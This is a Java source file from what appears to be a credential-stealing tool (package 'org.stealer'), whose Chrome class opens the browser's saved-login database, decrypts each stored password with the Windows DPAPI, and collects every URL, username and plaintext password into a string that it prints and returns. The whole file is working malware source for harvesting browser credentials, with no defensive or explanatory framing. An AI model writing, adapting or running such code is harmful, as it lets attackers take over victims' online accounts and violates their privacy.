package org.stealer.app.impl;

import java.io.File;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

import org.stealer.app.App;

import com.sun.jna.platform.win32.Crypt32Util;

public class Chrome implements App {

	@Override
	public String stealApp() throws Exception {
		File file = new File(System.getenv("APPDATA"));
		String path = file.getParent() + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
		
		Class.forName("org.sqlite.JDBC");
		System.out.println("jdbc:sqlite:" + path);
		Connection conn = DriverManager.getConnection("jdbc:sqlite:" + path);
		Statement stat = conn.createStatement();
		ResultSet rs;
		String message = "";
		for (rs = stat.executeQuery("select * from logins;"); rs.next();) {
			message += "--------------------";
			message += System.lineSeparator();
			message += "URL = " + rs.getString("origin_url");
			message += System.lineSeparator();
			message += "USERNAME = " + rs.getString("username_value");
			message += System.lineSeparator();
			byte p[] = rs.getBytes("password_value");
			byte decrypted[] = Crypt32Util.cryptUnprotectData(p);
			String pw = new String(decrypted);
			message += "PASSWORD = " + pw;
			message += System.lineSeparator();
		}
		System.out.println(message);
		rs.close();
		conn.close();
		stat.close();
		
		return message;
	}

}
